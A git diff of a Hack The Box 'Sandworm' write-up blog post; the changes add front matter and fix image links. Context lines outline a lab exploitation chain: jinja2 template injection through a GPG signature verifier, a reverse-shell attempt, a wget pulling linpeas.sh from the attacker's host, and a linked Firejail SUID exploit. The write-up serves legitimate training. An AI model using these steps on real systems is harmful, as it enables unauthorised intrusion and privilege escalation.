@@ -1,7 +1,15 @@
+---
+title: Hack The Box - Sandworm
+date: 2024-06-21 13:33:37 +0200
+categories:
+  - HackTheBox
+tags:
+  - HTB
+comments: true
+---
 
 HTB Sandworm Machine - https://www.hackthebox.com/machines/sandworm
 
-### 06/05/2024
 
 ### Scanning & Enumeration
 Scan the machine with Nmap tool
@@ -28,7 +36,7 @@ I found `admin` page but no Credentials. and I found `guide` page Interesting.
 ### Exploitation & Gaining Access
 There is a **Public Key** and **Signed Text** field. It takes **gpg key value** and **signed text** verified with that Key and it will Verify Signature.
 
-![[Pasted image 20250816235636.png]]
+![](/assets/img/posts/Pasted image 20250816235636.png)
 
 So now we have to generate a gpg key with command line.
 ```
@@ -77,7 +85,7 @@ This is my Signed Text:
 
 After putting this two Content into the Proper Field I press on Verify Signature and I found this below.
 
-![[Pasted image 20250816235814.png]]
+![](/assets/img/posts/Pasted image 20250816235814.png)
 
 I found **49** It is **jinja2** template engine. So it worked and it is exploitable.
 
@@ -114,7 +122,7 @@ Password: A1234567
 ```
 
 After making and putting those in input field I get the UID of user `atlas`.
-![[Pasted image 20250817000027.png]]
+![](/assets/img/posts/Pasted image 20250817000027.png)
 
 Then I change the `id` command with a reverse shell command but it shows Error. Not supporting `< >`.
 
@@ -259,7 +267,7 @@ silentobserver@sandworm:~$ wget 10.10.16.17:8000/linpeas.sh
 
 When I run linpeas.sh I found the following interesting file.
 
-![[Pasted image 20250817000428.png]]
+![](/assets/img/posts/Pasted image 20250817000428.png)
 
 It has SUID permission. So we can use that for Exploitation. I search in **Google** for `Firejail exploit.` , I found this: https://gist.github.com/GugSaas/9fb3e59b3226e8073b3f8692859f8d25
 
